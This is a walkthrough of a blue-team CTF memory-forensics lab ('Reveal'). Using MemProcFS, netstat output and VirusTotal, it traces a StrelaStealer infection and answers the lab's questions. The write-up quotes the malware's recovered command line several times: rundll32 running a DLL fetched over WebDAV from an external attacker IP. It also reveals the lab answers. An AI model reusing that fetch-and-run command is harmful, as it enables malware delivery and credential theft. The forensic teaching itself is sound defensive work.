# Memory Analysis

<img width="739" alt="Screenshot 2025-02-01 at 4 59 57 PM" src="https://github.com/user-attachments/assets/3a569898-92ad-40b5-bfb7-1cc380939870" />

## Objective

The objective of this investigation is to analyze suspicious activity flagged by the SIEM on a workstation with access to sensitive financial data. The goal is to identify the malicious process, its parent process, and network connections, while assessing potential indicators of compromise (IOCs).

Using tools like MemProcFS, netstat, and VirusTotal, the investigation aims to confirm malicious activity, trace the attack’s origin, and determine if the system communicated with a Command and Control (C2) server. By mapping the attack to the MITRE ATT&CK framework, the investigation seeks to define the attack chain, ensure containment, and provide recommendations to strengthen security.

### Skills Learned

- **Threat Analysis and Detection**:
   - Identifying malicious processes and their parent-child relationships in memory dumps.
   - Analyzing network connections to detect potential Command and Control (C2) activity.
   - Using VirusTotal and AbuseIPDB to assess the reputation of suspicious IP addresses.

- **Memory Forensics**
   - Extracting and mounting memory dumps for investigation using MemProcFS.
   - Navigating process directories to analyze active and terminated processes.
   - Identifying the parent process ID (PPID) of malicious processes to understand attack flow.
 
- **Network Forensics**
   - Examining network telemetry using netstat outputs within memory dumps.
   - Detecting abnormal outbound connections and analyzing network traffic for potential threats.
   - Recognizing unusual ports and unauthorized access attempts.

- **Threat Intelligence and Attribution**
   - Leveraging open-source intelligence (OSINT) tools like VirusTotal to identify malware families.
   - Mapping attack behaviors to the MITRE ATT&CK framework to classify tactics and techniques.
   - Identifying known malware indicators such as StrelaStealer and Danabot.

### 🛠️ Tools Used

- **MemProcFS**: Used to parse and mount the memory dump for analysis.
- **Dokany**: Required for MemProcFS to function as a file system.
- **7-Zip**: Used to extract the memory dump file.
- **PowerShell**: Used to execute commands and navigate the investigation directories.
- **Netstat (via MemProcFS)**: Used to analyze network connections and detect suspicious activity.
- **VirusTotal**: Used to check the reputation of suspicious IP addresses and processes.
- **AbuseIPDB**: Used to check IP addresses for past reports of malicious activity.
- **MITRE ATT&CK Framework**: Used to map attack techniques and sub-techniques.
- **File Explorer**: Used to verify mounted memory dumps and navigate investigation files.
- **Web Browser**: Used to access online threat intelligence resources such as VirusTotal and AbuseIPDB.

---

### Preparation

**Download and Install MemProcFS**:

1) Open your web browser and visit MemProcFS GitHub repository ```https://github.com/ufrisk/MemProcFS```. 
2) Navigate to the ‘**Releases**’ section and download the latest release. The latest release at the time of my investigation is Version 5.14.

<img width="730" alt="Screenshot 2025-02-01 at 5 01 41 PM" src="https://github.com/user-attachments/assets/e63e220a-5442-46e8-a2df-6b97213d9887" />


<img width="733" alt="Screenshot 2025-02-01 at 5 03 35 PM" src="https://github.com/user-attachments/assets/98a788c0-dc89-4df3-b092-48c97993a6d7" />


**Download and Install Dependencies**:

1) From your web browser, visit the Dokany GitHub releases page ```https://github.com/dokan-dev/dokany/releases/latest``` to download the DOKANY file system library.
2) Select the DokanSetup.exe file.

<img width="731" alt="Screenshot 2025-02-01 at 5 07 23 PM" src="https://github.com/user-attachments/assets/7ad19674-2806-4b42-ad91-5988bf95eb8e" />


3) Navigate to the directory in which the downloaded file was saved and run the file.

<img width="732" alt="Screenshot 2025-02-01 at 5 09 01 PM" src="https://github.com/user-attachments/assets/a570facd-fb4d-430c-8fea-f1211b132677" />

<img width="432" alt="Screenshot 2025-02-01 at 5 18 23 PM" src="https://github.com/user-attachments/assets/317aaccb-5945-481d-ac18-6ced3a1b531c" />

---

- Download the lab file (memory dump) from ```https://cyberdefenders.org/blueteam-ctf-challenges/reveal/```.
- Password: cyberdefenders.org.

<img width="727" alt="Screenshot 2025-02-01 at 5 21 46 PM" src="https://github.com/user-attachments/assets/a435586f-8153-4c19-aebb-e55fe0be76d0" />

#

**Download and install 7zip**:

1) From your web browser, visit 7-zip download page ```https://www.7-zip.org/download.html```.
2) Click the download link that corresponds with your system.

<img width="724" alt="Screenshot 2025-02-01 at 5 24 05 PM" src="https://github.com/user-attachments/assets/aee14289-5057-4dff-bb22-821d940a62bb" />

3) Navigate to the directory in which the downloaded file was saved and run the file.

<img width="732" alt="Screenshot 2025-02-01 at 5 24 56 PM" src="https://github.com/user-attachments/assets/d08d8e8b-af6e-4761-a60e-ff816edfdb2d" />

<img width="304" alt="Screenshot 2025-02-01 at 5 25 41 PM" src="https://github.com/user-attachments/assets/0441dc1f-243f-43ae-9dc3-09ad136de1f4" />


Use **7-Zip** to extract the memory dump file. When prompted for a password, enter ‘**cyberdefenders.org**’ to proceed with the extraction. This step ensures that the memory dump is accessible for further analysis.

---

**Investigation With MemProcFS**

Open PowerShell with Administrator privileges and navigate to the directory containing the investigation file (memory dump).

<img width="728" alt="Screenshot 2025-02-02 at 1 23 19 PM" src="https://github.com/user-attachments/assets/74e61601-56e2-4494-9481-6ee3910495b5" />

Once in the correct directory, change to the MemProcFS folder by executing the following command:
```cd .\MemProcFS```

<img width="726" alt="Screenshot 2025-02-02 at 1 24 11 PM" src="https://github.com/user-attachments/assets/e2eea607-aabd-4b43-89ac-cc771295eaf1" />

#

Run the **MemProcFS.exe** executable and specify the path to the **memory dump** by entering the following command in **PowerShell**:

```.\MemProcFS.exe -device C:\Users\UserName\Desktop\192-Reveal\192-Reveal.dmp```

When a **pop-up window** appears, click '**Yes**' to proceed. This action will mount the memory dump for further analysis.

<img width="727" alt="Screenshot 2025-02-02 at 1 27 43 PM" src="https://github.com/user-attachments/assets/7cd80c2f-8e78-4b3c-8460-1586b13483c6" />

#

Take note of the **mount point** where the memory dump has been attached. In this case, the memory dump is mounted on the **M:** drive, allowing access to its contents for further analysis.

<img width="726" alt="Screenshot 2025-02-02 at 1 30 43 PM" src="https://github.com/user-attachments/assets/90643df6-37ec-4077-8f5d-ba51337c559b" />

#

Verify the mount by opening **File Explorer** and navigating to **This PC**. You should see the memory dump mounted as the **M:** drive under **Network Locations**, confirming that the memory image is accessible for analysis.

<img width="728" alt="Screenshot 2025-02-02 at 1 32 29 PM" src="https://github.com/user-attachments/assets/95d9ce90-0edd-4026-85d6-d5c38a6dcd1e" />

---

**_Q1: Identifying the name of the malicious process helps in understanding the nature of the attack. What is the name of the malicious process?_**

MemProc does an excellent job of parsing various system files and organizing them into directories for easier analysis. One of the most important directories is the **sys** directory, which contains comprehensive information about the system itself. Additionally, two other key directories are the **pid** directory and the **name** directory.
- The **name** directory stores the names of processes along with their corresponding Process IDs (PIDs), making it easier to identify running processes.
- The **pid** directory, on the other hand, categorizes all processes based on their unique PIDs, allowing for more detailed examination of individual processes.
  
By structuring data this way, MemProc makes it easier to analyze system activity and investigate potential issues.

<img width="630" alt="Screenshot 2025-02-02 at 1 37 38 PM" src="https://github.com/user-attachments/assets/2883df1e-aebb-488c-90c9-a8d04e386435" />

To begin the investigation, we first examine network connections to check for any existing connections to a potential **Command and Control (C2) server**. Identifying suspicious outbound connections can help determine if a system has been compromised.

Some common indicators of malicious outbound connections include:
- **Unusual ports**: Legitimate web traffic typically uses ports 80 (HTTP) or 443 (HTTPS). Any outbound connections using uncommon ports, such as ports 4444, 8080,5555, 1337, 6667, could indicate malicious activity.
- **Unusual processes making outbound connections**: If a process that normally doesn’t require internet access—such as cmd.exe / powershell.exe —is observed connecting to an external IP address, especially on an uncommon port, it could suggest unauthorized activity or malware presence.

By carefully analyzing network traffic, we can identify potential threats and determine if an attacker is maintaining remote access to the system.

Within the **sys** directory, navigate to the **net** directory, where you will find the output of the **netstat** command. This directory contains detailed information about active network connections, including established connections, listening ports, and associated processes. Analyzing this data can help identify suspicious outbound or inbound connections that may indicate malicious activity.

<img width="733" alt="Screenshot 2025-02-02 at 2 26 44 PM" src="https://github.com/user-attachments/assets/c2f5fa8d-dd93-4384-aa1a-5afb76297f94" />

<img width="730" alt="Screenshot 2025-02-02 at 2 27 27 PM" src="https://github.com/user-attachments/assets/ce3cd0f5-b6fc-495f-93d4-0a5a23971d0a" />

#

Within the file(s) extracted from the memory dump that contains the output of the **netstat** command, you will find key details about network connections. These details include **PIDs (Process Identifiers)**, which help track the processes initiating connections; **Proto (Protocols)**, specifying whether the connection uses TCP or UDP; **State**, indicating the connection's current status (e.g., ESTABLISHED, LISTENING, or CLOSED); **Src (Source IP)**, representing the originating IP address; **Dst (Destination IP)**, identifying the target IP address; and **Process**, which lists the name of the process associated with the connection. Examining this information allows us to detect unusual or malicious network activity within the memory dump.

<img width="725" alt="Screenshot 2025-02-02 at 2 31 26 PM" src="https://github.com/user-attachments/assets/030946fd-f00a-4ae3-8aec-c946a11e6113" />

It is important to closely examine connections marked as **ESTABLISHED**, as they indicate active communication between the system and an external server. Additionally, special attention should be given to unusual ports listed under the **Dst (Destination)** column, as connections to uncommon or suspicious ports may suggest unauthorized access or potential communication with a command and control (C2) server. Identifying and analyzing these connections can help detect malicious activity and prevent further compromise.

The process **net.exe** was detected in the output of the netstat command. This process is actively establishing an outbound network connection to port 8888, which is not commonly used for legitimate communication. Such activity could indicate potential malicious behavior, including unauthorized remote access or communication with a Command and Control (C2) server. Further analysis is required to assess the nature of this connection and determine if it poses a security risk.

#

<img width="727" alt="Screenshot 2025-02-02 at 2 37 04 PM" src="https://github.com/user-attachments/assets/6d6b6398-d03f-4a8f-bbd1-06cedb3fd61d" />

#

We start by checking the reputation of the destination IP address using threat intelligence sources. This helps determine if the IP is linked to malicious activities, such as malware, phishing, or Command and Control (C2) servers, guiding our next steps in the investigation.

The **VirusTotal** report indicated that twelve security vendors had flagged the **IP address** as **malicious**. Further analysis revealed that the IP is linked to **StrelaStealer** malware, a known information-stealing threat. **StrelaStealer** is designed to extract sensitive data, such as email credentials, from infected systems.

<img width="726" alt="Screenshot 2025-02-02 at 2 40 40 PM" src="https://github.com/user-attachments/assets/0ce46442-5f86-421f-be02-e25c6c7f89aa" />

#

The IP address was also listed on AbuseIPDB, with a comment from the reporter providing additional information about its suspicious activity. The comment stated: ```WebDAV Malware: \45.9.74.32@8888\davwwwroot\1567.dll, entry```. This suggests that the IP address is associated with malware, specifically leveraging the WebDAV protocol for malicious purposes.

<img width="726" alt="Screenshot 2025-02-02 at 2 42 41 PM" src="https://github.com/user-attachments/assets/33096532-8d5a-4a6e-9f6b-034917a33ad3" />

#

Now that we have identified **net.exe** as a suspicious process, we can proceed by navigating to the proc directory within the **sys** directory. This will allow us to further examine information related to this process and gather more insights into its activity.

<img width="726" alt="Screenshot 2025-02-02 at 2 44 02 PM" src="https://github.com/user-attachments/assets/c0329fc6-b561-4709-9c0f-9787820516b1" />

#

Within the proc directory, we find files that correspond to processes that were actively running at the time the memory dump was captured. These files provide valuable information about the state of the system and the processes running at that specific moment, helping us analyze potential threats.

<img width="735" alt="Screenshot 2025-02-02 at 2 45 20 PM" src="https://github.com/user-attachments/assets/309dbe34-fa5b-4175-a018-60c8f6772764" />

#

Within the **proc-v.txt** file, we can view the list of processes that were running at the exact moment the memory dump was captured. The output includes each process along with its corresponding child processes, the file path, and the command-line arguments used during execution. All parent processes are identified by a **single dash (-)** before their names, while each child process is represented by **one additional dash** compared to its parent. This hierarchical structure clearly distinguishes parent processes from their child processes, making it easier to analyze process relationships and monitor system activity.

<img width="722" alt="Screenshot 2025-02-02 at 2 47 35 PM" src="https://github.com/user-attachments/assets/639e72ae-6dc4-4e91-90f1-ba65c751b6b7" />

#

Within the text file, we need to locate the process that we previously identified as suspicious. To do this efficiently, we can use the search function by pressing **CTRL + F** on our keyboard, entering the process name, and clicking Find **Next**.

<img width="729" alt="Screenshot 2025-02-02 at 2 48 32 PM" src="https://github.com/user-attachments/assets/d0b044b5-07f6-40db-b5da-ff5b29f1a741" />

#

When examining the suspicious process **net.exe**, we noticed that it has **two dashes (--)** before its name, showing that it is a **child process** of another process. Above it, we see **powershell.exe** with **one dash (-)**, meaning it is the **parent process** of **net.exe**. 

When we look at the command line output for the parent process (powershell.exe), we see that it matches the command reported on AbuseIPDB. This connection suggests the activity might be related to a known threat.

<img width="723" alt="Screenshot 2025-02-02 at 2 51 52 PM" src="https://github.com/user-attachments/assets/cbafc9e4-41eb-478f-a199-d9eb87baeba9" />

#

This suggests that the malicious process is **powershell.exe**, as it is directly involved in executing suspicious commands, potentially leading to harmful activity on the system.

<img width="727" alt="Screenshot 2025-02-02 at 2 52 54 PM" src="https://github.com/user-attachments/assets/c92ac83a-f054-4f98-9c38-8dce746556ed" />

---

**_Q2: Knowing the parent process ID (PPID) of the malicious process aids in tracing the process hierarchy and understanding the attack flow. What is the parent PID of the malicious process?_**

Looking at the output of the **proc-v.txt** file, we observe two sets of numbers following each process entry. The first set represents the **PID (Process Identifier)**, which uniquely identifies the process within the system. The second set is the **Parent Process Identifier (PPID)**, which points to the process that initiated or parented the current process.

<img width="722" alt="Screenshot 2025-02-02 at 2 55 00 PM" src="https://github.com/user-attachments/assets/63e398b5-2c3a-49b4-9c47-dac8b761111b" />

#

With that in mind, we notice two sets of numbers after the **powershell.exe** process entry. The first set is the Process ID (PID), which uniquely identifies the running PowerShell instance. The second set is the Parent Process ID (PPID), indicating the process that started PowerShell.

<img width="733" alt="Screenshot 2025-02-02 at 2 56 22 PM" src="https://github.com/user-attachments/assets/303cf2b0-6270-43ca-b383-1ee7d1917262" />

#

<img width="731" alt="Screenshot 2025-02-02 at 2 56 51 PM" src="https://github.com/user-attachments/assets/952e115c-b0c3-4a37-ae11-971d4df27f65" />

---

**_Q3: Determining the file name used by the malware for executing the second-stage payload is crucial for identifying subsequent malicious activities. What is the file name that the malware uses to execute the second-stage payload?_**

Examining the command line output ```\\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry``` of the malicious process powershell.exe, we see that powershell.exe was used to attempt to retrieve and execute the **3435.dll** file.

<img width="730" alt="Screenshot 2025-02-02 at 3 00 00 PM" src="https://github.com/user-attachments/assets/1281b2d4-850c-42bd-935b-e035175d8d19" />

#

<img width="728" alt="Screenshot 2025-02-02 at 3 00 14 PM" src="https://github.com/user-attachments/assets/5c51457a-7c4e-46a5-bc4d-6d1ac7b9b218" />

---

**_Q4: Identifying the shared directory on the remote server helps trace the resources targeted by the attacker. What is the name of the shared directory being accessed on the remote server?_**


From the command line output, ```\\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry``` of the malicious process powershell.exe, we see that the targeted directory is **davwwwroot**. This indicates that powershell.exe was used to access the remote directory and attempt to run the 3435.dll file.

<img width="730" alt="Screenshot 2025-02-02 at 3 02 34 PM" src="https://github.com/user-attachments/assets/cd55e067-e512-45d2-9084-e705966e72a6" />

---

**_Q5: What is the MITRE ATT&CK sub-technique ID that describes the execution of a second-stage payload using a Windows utility to run the malicious file?_**

From the command line output, ```\\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry``` of the malicious process powershell.exe, we observed that windows utility used to run the malicious file is the **rundll32**. To determine the Mitre ATT&CK sub-technique ID, we have to navigate to the MITRE ATT&CK web page search for rundll32.

<img width="727" alt="Screenshot 2025-02-02 at 3 37 58 PM" src="https://github.com/user-attachments/assets/5caccaa6-542e-41bf-909b-73e64f9bddd9" />

#

<img width="728" alt="Screenshot 2025-02-02 at 3 39 15 PM" src="https://github.com/user-attachments/assets/3b456e2e-c4f1-4594-b942-cbe31b80b0e9" />

---

**_Q6: Identifying the username under which the malicious process runs helps in assessing the compromised account and its potential impact. What is the username that the malicious process runs under?_**

To identify the user name, we go back to the **proc-v.txt** file and search for the malicious process. This file will contain information about the process, including the username associated with it. By examining these details, we can determine which user account was involved with the malicious process.

<img width="734" alt="Screenshot 2025-02-02 at 3 40 37 PM" src="https://github.com/user-attachments/assets/045353c4-8f2d-4bf8-b178-c94c2ea031c2" />

#

<img width="728" alt="Screenshot 2025-02-02 at 3 40 48 PM" src="https://github.com/user-attachments/assets/d5e9dc42-adc6-49bf-ad9d-330bcc71117f" />

---

**_Q7: Knowing the name of the malware family is essential for correlating the attack with known threats and developing appropriate defenses. What is the name of the malware family?_**

During our enrichment process, we submitted an IOC (the destination IP address involved in the **net.exe** process) to VirusTotal. From the report generated by VirusTotal, we see that the IP address has activity related to **STRELASTEALER**. 

<img width="628" alt="Screenshot 2025-02-02 at 3 43 13 PM" src="https://github.com/user-attachments/assets/2d9bf368-7e19-4f92-8083-14737216a35d" />

#

<img width="628" alt="Screenshot 2025-02-02 at 3 43 21 PM" src="https://github.com/user-attachments/assets/a295ea9b-ca19-4631-8253-e887d1bcbf5b" />
